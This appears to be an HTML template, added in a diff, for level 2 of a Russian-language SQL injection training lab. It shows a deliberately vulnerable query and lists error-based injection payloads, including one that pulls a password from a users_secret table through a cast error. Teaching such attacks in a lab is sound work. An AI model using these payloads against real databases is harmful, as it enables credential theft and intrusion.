@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Уровень 2 - Error-Based SQL Injection</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', 'Segoe UI', system-ui, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .navbar {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 15px 30px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo h2 {
+            color: white;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .user-name {
+            color: white;
+        }
+
+        .logout-btn, .back-btn {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 40px;
+            text-decoration: none;
+        }
+
+        h1 {
+            text-align: center;
+            color: white;
+            margin-bottom: 20px;
+        }
+
+        .description {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 30px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .level-container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .attack-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .attack-card h2 {
+            color: white;
+            margin-bottom: 15px;
+        }
+
+        .vulnerability {
+            background: rgba(244, 67, 54, 0.3);
+            padding: 10px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            color: #ffcccc;
+        }
+
+        .examples {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .examples h3 {
+            color: #ffd700;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .examples p {
+            color: #ccffcc;
+            font-family: monospace;
+            font-size: 12px;
+            margin-bottom: 5px;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .input-group input {
+            padding: 12px;
+            border-radius: 10px;
+            border: none;
+            background: rgba(255, 255, 255, 0.9);
+            font-size: 14px;
+        }
+
+        .input-group button {
+            padding: 12px;
+            border-radius: 10px;
+            border: none;
+            background: #ffd700;
+            color: #333;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .input-group button:hover {
+            background: #ffed4a;
+            transform: scale(1.02);
+        }
+
+        .tip {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(33, 150, 243, 0.3);
+            border-radius: 10px;
+            color: white;
+            font-size: 14px;
+        }
+
+        @media (max-width: 768px) {
+            .navbar {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <div class="logo">
+            <h2>SQL Injection Lab</h2>
+        </div>
+        <div class="user-info">
+            <span class="user-name">Welcome, {{ username }}</span>
+            <a href="/levels" class="back-btn">← Назад к уровням</a>
+            <a href="/logout" class="logout-btn">Выйти</a>
+        </div>
+    </div>
+
+    <h1>Уровень 2: Error-Based SQL Injection</h1>
+    <div class="description">
+        Используйте ошибки SQL для извлечения информации о структуре базы данных
+    </div>
+
+    <div class="level-container">
+        <div class="attack-card">
+            <h2>🎯 Поиск пользователя по ID</h2>
+            <div class="vulnerability">
+                🔴 Уязвимый код: SELECT id, username, email FROM users_secret WHERE id = [INPUT]
+            </div>
+            
+            <div class="examples">
+                <h3>💡 Примеры Error-based инъекций:</h3>
+                <p>1. 1' (вызовет синтаксическую ошибку)</p>
+                <p>2. 1 AND 1=CAST((SELECT password FROM users_secret LIMIT 1) AS int) --</p>
+                <p>3. 1 AND 1=CONVERT(int, @@version) --</p>
+                <p>4. 1 AND 1=(SELECT TOP 1 username FROM users_secret) --</p>
+            </div>
+
+            <form action="/level/2/search" method="POST">
+                <div class="input-group">
+                    <input type="text" name="user_id" placeholder="Введите ID пользователя...">
+                    <button type="submit">Поиск</button>
+                </div>
+            </form>
+
+            <div class="tip">
+                <strong>📖 Теория:</strong> Error-based инъекции используют сообщения об ошибках SQL для получения информации.
+                Когда вы вводите некорректные данные, база данных возвращает ошибку, которая может раскрыть 
+                структуру таблиц, имена колонок и даже данные.
+            </div>
+        </div>
+    </div>
+</body>
+</html>
